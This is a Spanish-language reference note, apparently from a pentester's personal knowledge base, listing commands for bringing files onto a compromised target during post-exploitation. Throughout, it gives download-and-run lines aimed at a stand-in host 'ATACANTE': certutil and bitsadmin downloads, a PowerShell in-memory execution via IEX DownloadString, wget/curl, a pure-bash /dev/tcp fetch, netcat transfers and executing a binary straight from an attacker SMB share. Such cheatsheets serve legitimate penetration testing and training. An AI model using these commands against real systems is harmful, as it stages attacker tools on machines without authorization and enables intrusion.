---
tipo: meta
aliases:
  - Transferencia - matriz
  - file transfer cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Transferencia de archivos - matriz de referencia

> [!info] Referencia pura, no un zettel
> Comandos para **traer** un archivo al objetivo (ingress). El criterio —qué canal según el entorno— vive en [[MOC - Transferencia de archivos]] y [[Traer herramientas al objetivo]]. Para sacar datos, [[Exfiltración - matriz de referencia]]; para hablar con un servicio FTP puntual, [[FTP - matriz de referencia]].

## Servir el archivo desde el box del atacante

Cuando el objetivo no tiene internet pero te alcanza a vos.

HTTP efímero (Python):
`python3 -m http.server 80`

HTTP efímero (PHP / Ruby, si no hay Python):
`php -S 0.0.0.0:80`
`ruby -run -e httpd . -p 80`

SMB (Impacket) — sirve un recurso `share` desde el directorio actual:
`impacket-smbserver share . -smb2support`
Con credenciales (SMBv3 forzado, evita el modo abierto):
`impacket-smbserver share . -smb2support -user u -password p`

FTP efímero (Python):
`python3 -m pyftpdlib -p 21 -w`

## Windows — traer

`certutil`, la clásica. Descarga y decodifica; muy vigilada:
`certutil -urlcache -split -f http://ATACANTE/nc.exe c:\windows\temp\nc.exe`

PowerShell, descargar a disco:
`powershell -c "Invoke-WebRequest http://ATACANTE/f.exe -OutFile c:\temp\f.exe"`
`powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATACANTE/f.exe','c:\temp\f.exe')"`

PowerShell, ejecutar en memoria (sin tocar disco):
`powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATACANTE/s.ps1')"`

`bitsadmin`, transferencia en segundo plano:
`bitsadmin /transfer job http://ATACANTE/f.exe c:\temp\f.exe`

`curl.exe` (Windows 10 1803+):
`curl http://ATACANTE/f.exe -o c:\temp\f.exe`

Desde un SMB servido por el atacante — copiar o ejecutar directo:
`copy \\ATACANTE\share\f.exe c:\temp\f.exe`
`\\ATACANTE\share\f.exe`

## Linux — traer

`wget` / `curl`:
`wget http://ATACANTE/lin.elf -O /tmp/lin.elf`
`curl http://ATACANTE/lin.elf -o /tmp/lin.elf`

Sin `wget` ni `curl` — bash puro por `/dev/tcp`:
`exec 3<>/dev/tcp/ATACANTE/80; echo -e "GET /f\r\n" >&3; cat <&3 >/tmp/f`

`nc` (netcat) — receptor en el objetivo, emisor en el box:
objetivo: `nc -lvnp 4444 > /tmp/f`
atacante: `nc ATACANTE_ok 4444 < f`

`scp` si hay SSH:
`scp f user@OBJETIVO:/tmp/f`

## Sin ninguna utilidad de red — base64 por copiar y pegar

Cuando solo hay una consola (shell restringida, sin salida de red).
atacante: `base64 -w0 f`  → copiar la cadena
objetivo (Linux): `echo 'BASE64' | base64 -d > /tmp/f`
objetivo (Windows): `certutil -decode in.b64 out.exe`

## Verificar que llegó entero

Comparar el hash a ambos lados antes de ejecutar.
`sha256sum f`  (Linux)
`Get-FileHash f.exe -Algorithm SHA256`  (Windows)
`certutil -hashfile f.exe SHA256`  (Windows sin PowerShell)

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `certutil` descarga 0 bytes | caché previa | agregar `-urlcache -split -f` |
| binario "corrupto" al ejecutar | transferencia en modo texto (FTP) | forzar binario, o verificar hash |
| SMB no monta desde Win10/11 | SMBv1 deshabilitado | `-smb2support` en el server |
| PowerShell IWR muy lento | barra de progreso | `$ProgressPreference='SilentlyContinue'` |
